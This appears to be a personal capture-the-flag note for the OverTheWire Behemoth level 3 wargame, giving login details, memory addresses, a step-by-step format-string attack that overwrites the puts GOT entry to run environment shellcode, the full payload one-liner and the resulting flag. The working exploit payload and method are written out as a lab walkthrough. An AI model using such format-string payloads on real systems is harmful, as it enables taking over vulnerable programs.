---
tags:
  - ctf
  - "#format_string"
created: 2026-05-24
---

# `Level [3]` 
> 

## 🔐 Connection data

| Parameter | Value                         |
| --------- | ----------------------------- |
| Host      | behemoth.labs.overthewire.org |
| Port      | 2221                          |
| Login     | behemoth3                     |
| Password  | JQ6tZGqt0i                    |

## 🎯 Task of the leves
- format string attack to get shell
## 🎯 Information

| Type of information         | Data                               |
| --------------------------- | ---------------------------------- |
| arg to format string attack | `1`                                |
| shellcode env addr          | `0xffffd45c`<br>`\x5c\xd4\xff\xff` |
| puts addr                   | `0804b218` <br>`\x18\xb2\x04\x08`  |


## 🎯 Tools

| Tool             | Destination                             | Usage                            |
| ---------------- | --------------------------------------- | -------------------------------- |
| `fmtstr_payload` | create payload for format string attack | `fmtstr_payload(arg,addr1,add2)` |
## 📚 Key commands/technics

| Coomand                | Desctiption                      |
| ---------------------- | -------------------------------- |
| `objdump -R behemoth3` | find GOT address, for now - PUTS |
|                        |                                  |
|                        |                                  |

## 💡 Step by step

| Step | Action               | Information                                                                                                                                   |
| ---- | -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | detect attack type   | `format string attack`                                                                                                                        |
| 2    | find argument number | `AAAA %p %p %p %p`                                                                                                                            |
| 3    | put shellcode to env | export SHELLCODE                                                                                                                              |
| 4    | get PUTS addr        | `objdump -R /behemoth/behemoth3`                                                                                                              |
| 5    | create payload       | `(python3 -c 'import sys; sys.stdout.buffer.write(b"\x18\xb2\x04\x08\x1a\xb2\x04\x08%54356x%1$hn%11171x%2$hn")'; cat) \| /behemoth/behemoth3` |
|      |                      |                                                                                                                                               |

## 🔍 Result
Flag: hpjUdlG723

## 🚪 Travel
-> [Level_3]

## 🔗 Link
- [Название ресурса](URL)

